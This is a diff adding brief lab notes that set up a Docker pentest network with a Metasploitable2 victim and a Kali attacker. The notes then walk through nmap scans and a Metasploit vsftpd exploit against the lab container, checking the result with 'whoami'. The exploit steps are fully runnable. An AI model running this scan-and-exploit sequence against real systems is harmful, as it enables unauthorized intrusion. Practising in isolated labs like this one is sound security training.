@@ -1,0 +1,55 @@
+serveur
+
+docker search metasploitable
+
+docker pull tleemcjr/metasploitable2
+
+docker pull kalilinux/kali-rolling
+
+docker images
+
+apt update && apt install -y kali-desktop-xfce
+
+docker network create pentest
+
+
+docker run --network=pentest -h victim -itd --rm --name metasploitable2 --privileged  -p 80:80  tleemcjr/metasploitable2
+
+
+docker run --network=pentest -h attacker -itd --rm --name kalibox kalilinux/kali-rolling
+
+
+docker run --network=pentest -h attack -itd --rm --name kalibox --privileged kalilinux/kali-rolling
+
+
+docker exec -it metasploitable2 bash
+
+docker exec -it kalibox bash
+
+On kali
+apt update
+apt install net-tools
+apt install nmap
+
+
+ifconfig
+
+nmap -F 172.18.0.3
+
+apt install metasploit-framework
+
+
+nmap -sV -p 21 172.18.0.3
+
+
+msfconsole
+search vsftpd
+
+
+use 1
+set rhosts 172.18.0.3
+set rport 21
+exploit
+
+
+whoami
